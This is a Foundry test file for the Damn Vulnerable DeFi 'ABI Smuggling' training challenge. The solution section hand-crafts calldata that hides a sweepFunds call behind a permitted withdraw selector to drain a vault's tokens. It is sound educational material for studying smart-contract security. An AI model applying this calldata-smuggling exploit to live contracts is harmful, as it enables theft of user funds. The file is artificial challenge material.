// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {SelfAuthorizedVault, AuthorizedExecutor, IERC20} from "../../src/abi-smuggling/SelfAuthorizedVault.sol";

contract ABISmugglingChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    
    uint256 constant VAULT_TOKEN_BALANCE = 1_000_000e18;

    DamnValuableToken token;
    SelfAuthorizedVault vault;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableToken();

        // Deploy vault
        vault = new SelfAuthorizedVault();

        // Set permissions in the vault
        bytes32 deployerPermission = vault.getActionId(hex"85fb709d", deployer, address(vault));
        bytes32 playerPermission = vault.getActionId(hex"d9caed12", player, address(vault));
        bytes32[] memory permissions = new bytes32[](2);
        permissions[0] = deployerPermission;
        permissions[1] = playerPermission;
        vault.setPermissions(permissions);

        // Fund the vault with tokens
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        // Vault is initialized
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertTrue(vault.initialized());

        // Token balances are correct
        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
        assertEq(token.balanceOf(player), 0);

        // Cannot call Vault directly
        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
        vault.sweepFunds(deployer, IERC20(address(token)));
        vm.prank(player);
        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
        vault.withdraw(address(token), player, 1e18);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_abiSmuggling() public checkSolvedByPlayer {
        // Selectors for AuthorizedExecutor.sol
        console.log("AuthorizedExecutor.setPermissions(bytes32[]):");
        console.logBytes4(bytes4(keccak256("setPermissions(bytes32[])")));
        console.log("AuthorizedExecutor.execute(address,bytes):");
        console.logBytes4(bytes4(keccak256("execute(address,bytes)")));
        console.log("AuthorizedExecutor.getActionId(bytes4,address,address):");
        console.logBytes4(bytes4(keccak256("getActionId(bytes4,address,address)")));

        // Selectors for SelfAuthorizedVault.sol
        console.log("SelfAuthorizedVault.withdraw(address,address,uint256):");
        console.logBytes4(bytes4(keccak256("withdraw(address,address,uint256)")));
        console.log("SelfAuthorizedVault.sweepFunds(address,address):"); // IERC20 is treated as address
        console.logBytes4(bytes4(keccak256("sweepFunds(address,address)")));
        console.log("SelfAuthorizedVault.getLastWithdrawalTimestamp():");
        console.logBytes4(bytes4(keccak256("getLastWithdrawalTimestamp()")));

        // --- 手动构造calldata并执行低级调用 ---

        // 1. 获取 withdraw(address token, address recipient, uint256 amount) 
        // 和 sweepFunds(address receiver, IERC20 token) 的函数选择器
        bytes4 withdrawSelector = bytes4(keccak256("withdraw(address,address,uint256)"));
        bytes4 sweepFundsSelector = bytes4(keccak256("sweepFunds(address,address)"));

        // 2. 准备 withdraw和sweepFunds 函数的参数
        address tokenAddress = address(token);
        address recipientAddress = recovery; // 使用之前定义的 recovery 地址
        uint256 amount = 1 ether; // WITHDRAWAL_LIMIT

        // 3. 手动ABI编码 actionData (即 withdraw和sweepFunds 函数的 calldata)
        bytes memory withdrawActionData = abi.encodePacked(withdrawSelector, abi.encode(tokenAddress, recipientAddress, amount));
        bytes memory sweepFundsActionData = abi.encodePacked(sweepFundsSelector, abi.encode(recipientAddress, tokenAddress));

        // 4. 获取 execute(address,bytes) 的函数选择器
        bytes4 executeSelector = bytes4(keccak256("execute(address,bytes)"));

        // 5. 准备 execute 函数的参数
        address targetVault = address(vault);

        bytes memory finalCalldata = abi.encodePacked(
            executeSelector,
            bytes32(uint256(uint160(targetVault))),
            bytes32(uint256(0xc4)), // 0x40 + 100 + 32
            bytes32(uint256(withdrawActionData.length)),
            withdrawActionData,
            bytes32(uint256(sweepFundsActionData.length)),
            sweepFundsActionData
        );
        console.log("actionData.length:", withdrawActionData.length); // 100
        console.log("actionData.length:", sweepFundsActionData.length); // 68

        // 7. 执行低级调用
        // We need to ensure the call is made from the `player` context for permissions.
        // The `checkSolvedByPlayer` modifier already handles vm.startPrank(player, player).
        (bool success, bytes memory returnData) = address(vault).call(finalCalldata);
        require(success, "Low-level call to execute failed");
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // All tokens taken from the vault and deposited into the designated recovery account
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}
